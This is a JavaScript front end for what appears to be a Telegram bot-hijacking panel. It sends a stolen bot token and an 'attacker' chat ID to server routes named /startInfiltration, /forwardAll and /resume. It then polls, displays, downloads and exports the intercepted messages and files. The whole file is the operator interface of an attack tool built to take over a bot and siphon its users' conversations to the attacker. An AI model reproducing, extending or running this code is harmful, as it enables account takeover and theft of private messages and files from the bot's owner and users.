const logArea = document.getElementById('logArea');
const messagesArea = document.getElementById('messagesArea');
const alertBox = document.getElementById('alertBox');

function showAlert(message) {
  if (!alertBox) return;
  alertBox.textContent = message;
  alertBox.style.display = 'block';   
  setTimeout(() => {
    alertBox.style.display = 'none';
  }, 5000);
}

function updateLogs() {
  fetch("/logs")
    .then(resp => resp.json())
    .then(data => {
      logArea.textContent = data.logs.join("\n");
    })
    .catch(() => {});
}

function updateMessages() {
  fetch("/messages")
    .then(resp => resp.json())
    .then(data => {
      messagesArea.innerHTML = data.messages.map(msg => {
        let downloadLink = "";
        if (msg.fileId) {
          downloadLink = `
            <a href="/download?fileId=${msg.fileId}" target="_blank" class="download-link">
              <svg class="download-icon" viewBox="0 0 24 24">
                <path d="M5 20h14v-2H5v2zM12 2 5 9h4v6h6V9h4z"/>
              </svg>Download File
            </a>
          `;
        }
        return `<pre>${JSON.stringify(msg, null, 2)}${downloadLink}</pre>`;
      }).join("");
    })
    .catch(() => {});
}

setInterval(updateLogs, 2000);
setInterval(updateMessages, 2000);

document.getElementById('clearLogsBtn').addEventListener('click', async () => {
  await fetch("/clearLogs", { method: "POST" });
});

document.getElementById('startAttackBtn').addEventListener('click', async () => {
  const botTokenRaw = document.getElementById('botToken').value.trim();
  const attackerChatId = document.getElementById('malChatId').value.trim();
  let resp = await fetch("/startInfiltration", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ botTokenRaw, attackerChatId })
  });
  let data = await resp.json();

  if (!resp.ok) {
    if (resp.status === 429 && data.error.includes("You have reached the limit for this hour")) {
      showAlert(data.error);
    } else {
      logArea.textContent += "startAttack error => " + data.error + "\n";
    }
  }
});

document.getElementById('forwardAllBtn').addEventListener('click', async () => {
  const attackerChatId = document.getElementById('malChatId').value.trim();
  let resp = await fetch("/forwardAll", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ attackerChatId })
  });
  let data = await resp.json();

  if (!resp.ok) {
    if (resp.status === 429 && data.error.includes("You have reached the limit for this hour")) {
      showAlert(data.error);
    } else {
      logArea.textContent += "forwardAll error => " + data.error + "\n";
    }
  }
});

// Düzenlenen resume butonu: Rate limit hatasında alert ile uyarı gösteriyor
document.getElementById('resumeBtn').addEventListener('click', async () => {
  const attackerChatId = document.getElementById('malChatId').value.trim();
  let resp = await fetch("/resume", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ attackerChatId })
  });
  if (!resp.ok) {
    let data = await resp.json();
    if (resp.status === 429 && data.error.includes("You have reached the limit for this hour")) {
      showAlert(data.error);
    } else {
      logArea.textContent += "resume error => " + data.error + "\n";
    }
  }
});

document.getElementById('stopBtn').addEventListener('click', async () => {
  await fetch("/stop", { method: "POST" });
});

document.getElementById('exportMessagesBtn').addEventListener('click', async () => {
  try {
    const resp = await fetch("/messages");
    const data = await resp.json();
    const blob = new Blob([JSON.stringify(data.messages, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "messages.json";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  } catch (err) {
    console.error("Export Messages error:", err);
  }
});

document.getElementById('clearMessagesBtn').addEventListener('click', async () => {
  try {
    await fetch("/clearMessages", { method: "POST" });
    messagesArea.innerHTML = "";
  } catch (err) {
    console.error("Clear Messages error:", err);
  }
});
